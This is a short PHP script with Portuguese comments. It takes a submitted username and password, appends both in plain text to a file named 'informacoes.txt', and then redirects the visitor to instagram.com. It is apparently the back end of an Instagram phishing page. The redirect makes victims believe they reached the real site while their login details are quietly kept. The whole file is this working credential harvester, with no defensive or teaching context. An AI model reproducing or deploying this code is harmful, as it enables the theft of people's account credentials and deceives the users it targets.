<?php
// Verifica se os campos de usuário e senha foram enviados
if(isset($_POST['username']) && isset($_POST['password'])) {
    // Obtém os valores dos campos de usuário e senha
    $username = $_POST['username'];
    $password = $_POST['password'];
    
    // Abre ou cria o arquivo onde as informações serão salvas
    $file = fopen("informacoes.txt", "a");
    
    // Escreve as informações de usuário e senha no arquivo
    fwrite($file, "Usuário: " . $username . " - Senha: " . $password . "\n");
    
    // Fecha o arquivo
    fclose($file);
    
    // Redireciona o usuário para outra página
    header("Location: https://www.instagram.com/");
    exit();
}
?>
